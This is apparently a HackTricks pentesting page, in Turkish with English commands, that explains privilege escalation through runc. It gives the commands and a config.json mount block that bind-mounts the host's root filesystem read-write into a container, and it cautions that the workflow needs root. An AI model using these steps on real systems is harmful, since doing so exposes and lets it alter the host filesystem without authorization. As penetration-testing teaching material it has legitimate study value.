# RunC Privilege Escalation

## Temel bilgiler

**runc** hakkında daha fazla bilgi edinmek istiyorsanız aşağıdaki sayfaya göz atın:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Host üzerindeki rootful bir process için `runc` mevcutsa, host'un `/` dizinini container içindeki `/` konumuna recursive olarak bind-mount eden bir mount configuration'a sahip bir OCI bundle kullanarak host filesystem'ını bu mount namespace içinde açığa çıkarabilirsiniz.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Belgelenen `runc run` workflow'u rootful'dur: runc'in kendi örneklerinde bu işlem "run as root" olarak etiketlenir. Ayrıcalıksız bir kullanıcının `runc spec --rootless` gibi rootless bir yapılandırmaya ihtiyacı vardır ve runc, bu mod için user namespaces'in etkinleştirilmesi gerektiğini belirtir.<sup>[[1]](#references)</sup>

## References

- [1] [runc: Container'ları başlatmak ve çalıştırmak için CLI tool'u](https://github.com/opencontainers/runc#using-runc)
- [2] [OCI Runtime Specification: Mounts](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Shared Subtrees](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
